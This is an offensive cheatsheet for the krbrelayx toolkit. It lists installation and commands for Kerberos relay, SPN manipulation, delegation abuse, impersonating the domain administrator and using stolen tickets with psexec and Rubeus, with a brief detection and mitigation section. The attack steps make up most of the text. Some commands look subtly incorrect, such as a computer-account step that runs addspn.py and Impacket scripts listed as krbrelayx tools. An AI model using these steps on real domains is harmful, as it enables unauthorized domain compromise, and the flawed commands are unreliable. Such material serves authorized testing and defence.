# KrbRelayx Cheatsheet

## Quick Reference

### Installation
```bash
git clone https://github.com/dirkjanm/krbrelayx.git
cd krbrelayx
pip install -r requirements.txt
```

### Tools Included

| Tool | Purpose |
|------|---------|
| `krbrelayx.py` | Kerberos relay attacks |
| `addspn.py` | SPN manipulation |
| `getTGT.py` | Ticket acquisition |
| `getST.py` | Service ticket acquisition |

### Basic Commands

#### Kerberos Relay
```bash
python3 krbrelayx.py -t target.domain.local -s user
```

#### Get Service Ticket
```bash
python3 getST.py -spn MSSQLSvc/target.domain.local -impersonate administrator domain/user:password
```

#### Add SPN
```bash
python3 addspn.py -u domain/user -p password -t target_user -s MSSQLSvc/target.domain.local -a
```

### Unconstrained Delegation

#### Find Targets
```bash
impacket-findDelegation domain/user:password
```

#### Relay to DC
```bash
python3 krbrelayx.py -t dc01.domain.local -s cifs -relay-user administrator
```

### Constrained Delegation

#### Get Service Ticket
```bash
python3 getST.py -spn MSSQLSvc/target.domain.local -impersonate administrator domain/user:password
```

#### Use Ticket
```bash
export KRB5CCNAME=administrator.ccache
python3 impacket-mssqlclient target.domain.local -windows-auth
```

### Resource-Based Constrained Delegation

#### Add Computer Account
```bash
python3 addspn.py -u domain/user -p password -t target_user -s cifs/target.domain.local -a
```

#### Get Ticket
```bash
python3 getST.py -spn cifs/target.domain.local -impersonate administrator domain/user:password
```

### Ticket Usage

#### Export Ticket
```bash
export KRB5CCNAME=administrator.ccache
```

#### Use with Impacket
```bash
impacket-psexec domain/administrator@target.domain.local -k -no-pass
```

#### Use with Rubeus
```bash
Rubeus.exe ptt /ticket:ticket.kirbi
```

### Workflow

1. **Enumerate** delegation
2. **Identify** attack path
3. **Add** SPN if needed
4. **Get** service ticket
5. **Use** ticket for access

### Detection Indicators

| Indicator | Description |
|-----------|-------------|
| Unusual SPN | SPN changes |
| Relay attempts | Authentication forwarding |
| Delegation abuse | Unusual impersonation |

### Mitigation

- Use constrained delegation
- Implement resource-based constraints
- Monitor delegation changes
- Use gMSA

### Troubleshooting

#### KDC_ERR_S_PRINCIPAL_UNKNOWN
```bash
# Check SPN
python3 addspn.py -u domain/user -p password -t target_user -c
```

### Related Tools
- **Impacket:** Python network toolkit
- **Rubeus:** Kerberos toolkit
- **Certipy:** AD certificate abuse
